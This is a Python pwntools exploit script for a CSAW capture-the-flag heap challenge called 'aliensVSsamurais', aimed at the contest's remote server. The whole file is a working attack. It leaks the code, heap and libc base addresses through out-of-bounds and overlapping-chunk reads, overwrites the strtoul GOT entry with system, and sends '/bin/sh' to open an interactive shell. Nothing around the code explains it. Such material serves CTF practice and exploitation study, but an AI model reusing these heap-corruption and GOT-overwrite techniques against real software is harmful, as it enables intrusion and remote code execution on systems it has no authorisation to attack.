from pwn import *

#context.log_level = 'debug'

local = 0
e = ELF('./aliensVSsamurais')
if local:
	r = process('./aliensVSsamurais')
	libc = e.libc
else:
	os.environ['LD_PRELOAD'] = './libc-2.23.so'
	r = remote('pwn.chal.csaw.io', 9004)
	libc = ELF('./libc-2.23.so')


def new_samurai(sword_name):
	r.sendlineafter('Daimyo, nani o shitaidesu ka?\n', '1')
	r.sendlineafter('What is my weapon\'s name?\n', sword_name)
def kill_samurai(idx):
	r.sendlineafter('Daimyo, nani o shitaidesu ka?\n', '2')
	r.sendlineafter('Which samurai was dishonorable O lord daimyo?\n', str(idx))
def end_samurai():
	r.sendlineafter('Daimyo, nani o shitaidesu ka?\n', '3')

def new_alien(name, size=None):
	if not size:
		size = len(name)
	r.sendlineafter('what tasks do we have today.\n', '1')
	r.sendlineafter('How long is my name?\n', str(size))
	r.sendafter('What is my name?\n', name)
def consume_alien(idx):
	r.sendlineafter('what tasks do we have today.\n', '2')
	r.sendlineafter('Which alien is unsatisfactory, brood mother?', str(idx))
def rename_alien(idx, name):
	r.sendlineafter('what tasks do we have today.\n', '3')
	r.sendlineafter('my babies would you like to rename?\n', str(idx))
	r.sendafter(' to?\n', name)
def end_alien(idx):
	r.sendlineafter('what tasks do we have today.\n', '4')
def off2idx(offset):
	return 2305843009213693952+offset/8

def success1():
	for i in range(5):
		new_samurai('A'*8)
	end_samurai()
	new_alien('A'*8)
	
	# leak code base
	r.sendlineafter('what tasks do we have today.\n', '3')
	r.sendlineafter('my babies would you like to rename?\n', str(off2idx(0x70-0xc0)))
	r.recvuntil('rename ')
	code_base = u64(r.recv(6)+'\x00\x00') - 0x202070
	log.info('code_base: %#x' % code_base)
	r.send(p64(code_base+0x202070))
	
	# prepare pointers
	rename_alien(400, p64(code_base+0x202708))
	rename_alien(401, p64(code_base+e.got['strtoul']))
	
	# overwrite strtoul
	r.sendlineafter('what tasks do we have today.\n', '3')
	r.sendlineafter('my babies would you like to rename?\n', '200')
	r.recvuntil('rename ')
	libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['strtoul']
	log.info('libc_base: %#x' % libc_base)
	r.send(p64(libc_base+libc.symbols['system']))
	
	r.sendline('/bin/sh')
	r.clean()

def success2():
	for _ in range(200):
		r.sendline('1')
		r.sendline('AAAAAAAA')
	end_samurai()
	
	# prepare contiguous chunks
	new_alien('A'*0x10)
	new_alien('A'*0x10)
	new_alien('A'*0x10)
	new_alien('A'*0x10)
	new_alien('A'*0x10)#4
	consume_alien(0)
	consume_alien(1)
	consume_alien(2)
	consume_alien(3)
	
	# create overlapping
	new_alien('A'*0x40)
	new_alien('A'*(0x200-0x10)+p64(0x200), size=0x200)
	new_alien('A'*0x100)
	new_alien('A'*0x40)
	consume_alien(6)
	consume_alien(5)
	new_alien('A'*0x48)
	new_alien('\x00', size=0xf0)
	new_alien('B', size=0xf0)#11
	consume_alien(10)
	consume_alien(7)
	
	# consume 0x20 size chunks
	new_alien('A'*0x10)
	new_alien('A'*0x10)
	new_alien('A'*0x10)#14
	
	# leak heap base
	new_alien('B'*0xb0)
	new_alien('A'*0x10)
	r.sendlineafter('what tasks do we have today.\n', '3')
	r.sendlineafter('my babies would you like to rename?\n', '11')
	r.recvuntil('Oh great what would you like to rename ')
	heap_base = u64(r.recv(6)+'\x00\x00') - 0x55555575afe0 + 0x555555757000
	log.info('heap_base: %#x' % heap_base)
	r.send(p64(heap_base+0x2f30))
	
	# leak code base
	r.sendlineafter('what tasks do we have today.\n', '3')
	r.sendlineafter('my babies would you like to rename?\n', '16')
	r.recvuntil('Oh great what would you like to rename ')
	code_base = u64(r.recv(6)+'\x00\x00') - 0x2029c0
	log.info('code_base: %#x' % code_base)
	r.send(p64(code_base + 0x2029c0))
	
	# leak libc base & exploit
	rename_alien(11, p64(code_base+e.got['strtoul']))
	r.sendlineafter('what tasks do we have today.\n', '3')
	r.sendlineafter('my babies would you like to rename?\n', '16')
	r.recvuntil('Oh great what would you like to rename ')
	libc_base = u64(r.recv(6)+'\x00\x00') - libc.symbols['strtoul']
	log.info('libc_base: %#x' % libc_base)
	r.send(p64(libc_base + libc.symbols['system']))
	
	r.sendline('/bin/sh')

success2()
r.interactive()

